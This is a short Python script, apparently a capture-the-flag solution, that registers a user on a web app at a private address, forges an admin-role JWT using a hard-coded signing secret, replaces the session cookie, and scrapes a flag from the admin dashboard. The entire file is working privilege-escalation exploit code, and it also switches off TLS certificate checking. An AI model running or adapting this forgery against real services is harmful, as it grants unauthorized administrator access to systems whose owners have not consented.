import requests
import jwt
import datetime
import urllib3
import re

# Disable InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://192.168.1.58:5000"
USERNAME = "testuser"
PASSWORD = "testpass"
SECRET = "pasosdegigante"

session = requests.Session()
session.verify = False  # Ignore TLS cert warnings

# Register
session.post(f"{URL}/register", data={"username": USERNAME, "password": PASSWORD})

# Login
session.post(f"{URL}/login", data={"username": USERNAME, "password": PASSWORD})

# Find JWT cookie
token = None
cookie_name = None
for cookie in session.cookies:
    if cookie.value and '.' in cookie.value:
        token = cookie.value
        cookie_name = cookie.name
        break

# Forge admin token
def create_admin_token(username):
    payload = {
        "username": username,
        "role": "admin",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

admin_token = create_admin_token(USERNAME)
admin_token_str = admin_token.decode() if isinstance(admin_token, bytes) else admin_token

# Replace cookie with forged token
session.cookies.set(cookie_name, admin_token_str, domain="192.168.1.58")

# Access dashboard to get flag
r = session.get(f"{URL}/dashboard")

# Extract and print only the flag
flag_match = re.search(r'<div class="flag">(.*?)</div>', r.text, re.DOTALL)
if flag_match:
    print(flag_match.group(1).strip())
else:
    print("Flag not found.")
